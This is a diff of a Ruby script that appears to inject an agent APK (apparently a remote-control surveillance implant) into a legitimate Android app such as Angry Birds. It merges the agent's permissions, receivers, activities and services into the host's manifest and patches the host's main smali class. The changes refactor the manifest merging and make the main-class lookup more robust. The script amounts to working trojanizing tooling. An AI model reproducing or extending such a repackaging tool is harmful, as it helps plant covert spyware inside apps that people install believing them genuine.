@@ -68,18 +68,22 @@ def parseManifest(rcsdir, pkgdir)
 	end
 		
 	xmlpkg["uses-permission"] += xmlrcs["uses-permission"]
-	xmlpkg["application"][0]["receiver"] += xmlrcs["application"][0]["receiver"]
-	xmlpkg["application"][0]["activity"] += xmlrcs["application"][0]["activity"]
-	
-	if(xmlpkg["application"][0].has_key? "service") then
-		xmlpkg["application"][0]["service"] += xmlrcs["application"][0]["service"]
-	else
-		xmlpkg["application"][0]["service"] = xmlrcs["application"][0]["service"]
-	end
+
+	mixManifestApplication(xmlpkg,xmlrcs,"receiver")
+	mixManifestApplication(xmlpkg,xmlrcs,"activity")
+	mixManifestApplication(xmlpkg,xmlrcs,"service")	
 	
 	manifest = XmlSimple.xml_out(xmlpkg);
 
 	return name, manifest
+end
+
+def mixManifestApplication(xmlpkg,xmlrcs,key)
+	if(xmlpkg["application"][0].has_key? key) then
+		xmlpkg["application"][0][key] += xmlrcs["application"][0][key]
+	else
+		xmlpkg["application"][0][key] = xmlrcs["application"][0][key]
+	end
 end
 
 def patchManifest(rcsdir, manifest)
@@ -114,14 +118,21 @@ def patchStyle(rcsdir, style, color)
 	
 end
 
-def patchMain(rcsdir, mainpack)
-	print "patch main #{mainpack}\n"
-	#arr = mainpack.split('.')[0..-2].join('/')	
-	#file = mainpack.split('.').pop
-	filename = mainpack.split('.').join('/')	
+def patchMain(rcsdir, pkgdir, mainpkg)
+	print "patch main #{mainpkg}\n"
+	#arr = mainpkg.split('.')[0..-2].join('/')	
+	#file = mainpkg.split('.').pop
+	filename = mainpkg.split('.').join('/')	
 	print "filename = #{filename}\n"
 	
 	filepath = "#{rcsdir}/smali/#{filename}.smali"
+	
+	if !File.exists? filepath
+		filename = (pkgdir + mainpkg).split('.').join('/')
+		print "filename = #{filename}\n"	
+		filepath = "#{rcsdir}/smali/#{filename}.smali"
+	end
+	
 	contentFile = File.new(filepath, "r")
 	content=contentFile.read
 	contentFile.close
@@ -184,15 +195,17 @@ def patchConfig(rcsdir)
 end
 
 def main(package)
+	#FileUtils.rm("core.android.release.apk", :force => true );
+	#FileUtils.cp("../../bin/android_networking-release.apk","core.android.release.apk")
 	rcsdir=unpack("core.android.release.apk")
 	pkgdir=unpack(package)
 	
-	mainpack, newmanifest = parseManifest(rcsdir, pkgdir)
+	mainpkg, newmanifest = parseManifest(rcsdir, pkgdir)
 	style,color = parseStyle(rcsdir, pkgdir)
 	
 	merge(rcsdir,pkgdir)
 	
-	patchMain(rcsdir, mainpack)	
+	patchMain(rcsdir, pkgdir, mainpkg)	
 	patchManifest(rcsdir, newmanifest)	
 	patchStyle(rcsdir, style,color)
 	
@@ -210,7 +223,7 @@ def test()
 	rcsdir="core.android.release"
 	pkgdir="com.rovio.angrybirds"
 	#FileUtils.mv(rcsdir, "./#{pkgdir}")
-	mainpack, newmanifest = parseManifest(rcsdir, pkgdir)
+	mainpkg, newmanifest = parseManifest(rcsdir, pkgdir)
 	patchManifest(rcsdir, newmanifest)
 	
 	style,color = parseStyle(rcsdir, pkgdir)
